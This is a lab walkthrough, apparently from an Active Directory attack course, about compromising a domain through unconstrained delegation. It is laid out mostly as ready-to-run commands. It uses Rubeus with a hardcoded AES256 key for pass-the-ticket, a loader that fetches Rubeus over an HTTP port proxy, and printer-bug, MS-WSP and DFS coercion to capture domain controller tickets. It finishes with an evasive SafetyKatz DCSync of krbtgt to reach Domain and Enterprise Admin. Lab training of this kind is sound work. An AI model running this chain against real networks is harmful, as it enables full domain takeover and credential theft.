---
icon: vial
---

# 15 - Learning Object

## Tasks



1 - Find a server in the dcorp domain where Unconstrained Delegation is enabled

2 - Compromise the server and escalate to Domain Admin privileges

3 - Escalate to Enterprise Admins privileges by abusing Printer Bug

Flag 24 \[dcorp-appsrv] - Domain user who is a local admin on dcorp-appsrv 🚩



## Solutions

### 1 - Find a server in the dcorp domain where Unconstrained Delegation is enabled

Starting to find a server that has unconstrained delegation enabled:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```



### 2 - Compromise the server and escalate to Domain Admin privileges

Remembering that the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv.

We extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let's check if anyone of them have local admin privileges on dcorp-appsrv.

First, we will try with appadmin. Run the below command from an elevated command prompt:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```





and Run the below commands in the new process:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```



\


We can use multiple methods now to copy Rubeus to dcorp-appsrv to abuse Printer Bug using Loader and winrs.

Run the below command from the process running appadmin:

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```



Run Rubeus in listener mode in the winrs session on dcorp-appsrv:

```
winrs -r:dcorp-appsrv cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

Use the Printer Bug for Coercion

On the student VM, use MS-RPRN to force authentication from dcorp-dc$

```powershell
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```



On the Rubeus listener, we can see the TGT of dcorp-dc$:

\


Copy the base64 encoded ticket and use it with Rubeus on student VM. Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx...
```









Now, we can run DCSync from this process:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```







Use the Windows Search Protocol (MS-WSP) for Coercion

We can also use Windows Search Protocol for abusing unconstrained delegation. Please note that the Windows Search Service is enabled by default on client machines but not on servers. For the lab, we have configured it on the domain controller (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required).

Setup Rubeus in monitor mode exactly as we did for the Printer Bug. On the student VM, use the following command to force dcorp-dc to connect to dcorp-appsrv:

```
C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```







Use the Distributed File System Protocol (MS-DFSNM) for Coercion

If the target has DFS Namespaces service running, we can use that too for coercion (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required).

```
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```



```bash
```











```
```



### 3 - Escalate to Enterprise Admins privileges by abusing Printer Bug

To get Enterprise Admin privileges, we need to force authentication from mcorp-dc. Run the below command to listern for mcorp-dc$ tickets on dcorp-appsrv:

```powershell
winrs -r:dcorp-appsrv cmd
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```









Use MS-RPRN on the student VM to trigger authentication from mcorp-dc to dcorp-appsrv

```
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```







On the Rubeus listener, we can see the TGT of mcorp-dc$:

\




As previously, copy the base64 encoded ticket and use it with Rubeus on student VM. Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx...
```





Now, we can run DCSync from this process:

\


```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```







We escalated to Enterprise Admins too!

### Flag 24 \[dcorp-appsrv] - Domain user who is a local admin on dcorp-appsrv 🚩















